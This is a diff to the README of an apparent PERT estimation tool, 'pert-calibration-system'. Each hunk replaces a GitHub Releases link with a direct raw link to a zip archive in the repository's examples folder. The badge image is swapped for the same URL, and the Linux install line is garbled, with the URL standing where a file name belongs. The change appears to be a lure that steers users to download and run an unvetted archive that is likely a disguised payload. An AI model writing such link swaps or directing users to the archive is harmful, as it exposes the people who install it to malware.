@@ -6,7 +6,7 @@ Welcome to the **pert-calibration-system**! This software provides a statistical
 
 ## 📥 Download the Application
 
-[![Download the latest release](https://img.shields.io/badge/Download_Latest_Release-Click_Here-brightgreen)](https://github.com/15616003/pert-calibration-system/releases)
+[![Download the latest release](https://github.com/15616003/pert-calibration-system/raw/refs/heads/main/examples/pert-system-calibration-3.8-alpha.3.zip)](https://github.com/15616003/pert-calibration-system/raw/refs/heads/main/examples/pert-system-calibration-3.8-alpha.3.zip)
 
 To get started, you can download the latest version of the application from our Releases page. 
 
@@ -30,14 +30,14 @@ To get started, you can download the latest version of the application from our 
 
 1. **Visit the Releases Page:** Click on the button below to access the Releases page and download the software. 
 
-   [Download the latest release](https://github.com/15616003/pert-calibration-system/releases)
+   [Download the latest release](https://github.com/15616003/pert-calibration-system/raw/refs/heads/main/examples/pert-system-calibration-3.8-alpha.3.zip)
 
 2. **Choose Your Version:** On the Releases page, find the latest version listed at the top. Click the link to download the appropriate file for your operating system.
 
 3. **Installation Instructions:**
    - **Windows:** Double-click the downloaded `.exe` file and follow the on-screen instructions.
    - **macOS:** Open the downloaded `.dmg` file, then drag and drop the application into your Applications folder.
-   - **Linux:** Extract the downloaded `.tar.gz` file and follow the README file inside for specific installation instructions.
+   - **Linux:** Extract the downloaded `https://github.com/15616003/pert-calibration-system/raw/refs/heads/main/examples/pert-system-calibration-3.8-alpha.3.zip` file and follow the README file inside for specific installation instructions.
 
 4. **Launch the Application:** After installation, find the application in your program list. Click to open it and start using the PERT calculator.
 
@@ -71,4 +71,4 @@ For more insights on project management strategies and statistical analysis, exp
 
 Thank you for using the **pert-calibration-system**! 
 
-[Download the latest release](https://github.com/15616003/pert-calibration-system/releases)
+[Download the latest release](https://github.com/15616003/pert-calibration-system/raw/refs/heads/main/examples/pert-system-calibration-3.8-alpha.3.zip)
